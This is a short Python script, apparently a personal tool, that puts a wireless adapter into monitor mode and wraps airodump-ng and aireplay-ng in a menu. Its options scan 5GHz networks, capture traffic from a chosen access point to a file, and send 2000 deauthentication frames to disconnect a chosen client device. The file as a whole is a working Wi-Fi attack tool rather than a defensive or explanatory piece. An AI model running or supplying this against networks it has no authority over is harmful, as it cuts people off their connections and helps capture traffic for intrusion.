import subprocess
from time import sleep

subprocess.run("iwconfig")

adapter = input("Please enter your adapter name(e.g 'wlan0', 'wlan1'): ")


print("Entering Monitor Mode...")
sleep(1)

commands = [
    ["sudo", "systemctl", "stop", "NetworkManager"],
    ["sudo", "systemctl", "stop", "wpa_supplicant"],
    ["sudo", "ip", "link", "set", adapter, "down"],
    ["sudo", "iw", "dev", adapter, "set", "type", "monitor"],
    ["sudo", "ip", "link", "set", adapter, "up"]
]

for cmd in commands:
	try:
		subprocess.run(cmd, check=True)
		print(f"✅ Command succeeded: {' '.join(cmd)}")

	except Exception as e:
		print(f"Command failed: {' '.join(cmd)}")


print('\n')
print("\n Monitor mode has been successfully enabled...\n")
print('\n')
sleep(0.5)

choice = int(input("Please enter your choice | (1) Scan for 5GHz networks | (2) Scan a specific network | (3) Deauth a client | Please pick (1, 2 or 3): "))
try:
	if choice == 1:
		subprocess.run(["sudo", "airodump-ng", "--band", "a", adapter])

	elif choice == 2:
		bssid = input("Please enter the BSSID MAC address: ")
		channel = input("Please enter the channel of the MAC address: ")

		# The path to the folder navigates until the last dir change
		# Example, home/cole/airodump it will only go to home/cole and write in there,
		# If i do home/cole/airodump_output/airodump_output, it will write into the airodump folder then use airodump_ouput
		# As the name of the capture files.
		subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, '-w', '/home/cole/airdump_output/airdump_output', adapter])

	elif choice == 3:
		bssid = input("Please enter the BSSID MAC address: ")
		target_addr = input("Pleas enter the targets MAC address: ")

		subprocess.run(["sudo", "aireplay-ng", "--deauth", "2000", "-a", bssid, "-c", target_addr, adapter])

except KeyboardInterrupt:
	print("\n Detected Keyboard Interrupt, restoring network settings...")

finally:
	restore_network_commands = [
		["sudo", "ip", "link", "set", adapter, "down"],
    		["sudo", "iw", "dev", adapter, "set", "type", "managed"],
    		["sudo", "ip", "link", "set", adapter, "up"],
    		["sudo", "systemctl", "start", "wpa_supplicant"],
    		["sudo", "systemctl", "start", "NetworkManager"]
	]

	for cmd in restore_network_commands:
		subprocess.run(cmd)

	print("Commands have been ran succesfully now closing...")
